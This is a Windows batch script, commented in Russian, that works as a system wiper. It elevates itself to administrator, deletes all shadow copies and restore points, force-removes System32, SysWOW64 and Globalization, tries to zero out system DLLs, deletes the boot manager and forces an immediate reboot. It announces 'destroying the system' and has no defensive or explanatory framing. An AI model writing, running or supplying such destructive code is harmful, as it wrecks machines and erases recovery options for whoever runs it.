@echo off
:: Проверяем права администратора
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Запрос прав администратора...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

echo Уничтожение системы...

:: Удаляем теневое копирование
vssadmin delete shadows /all /quiet

:: Удаляем точки восстановления
powershell -Command "Get-ComputerRestorePoint | Remove-ComputerRestorePoint"

:: Удаляем папку Globalization и другие
rd /s /q C:\Windows\Globalization 2>nul
rd /s /q C:\Windows\System32 2>nul
rd /s /q C:\Windows\SysWOW64 2>nul

:: Перезаписываем случайные файлы в System32 нулями
for /r C:\Windows\System32 %%i in (*.dll) do (
    fsutil file createnew "%%i" 0 2>nul
)

:: Удаляем загрузчик
del /f /q C:\bootmgr 2>nul
del /f /q C:\bootmgr.efi 2>nul

echo Уничтожение завершено. Перезагрузка...
shutdown /r /t 0 /f
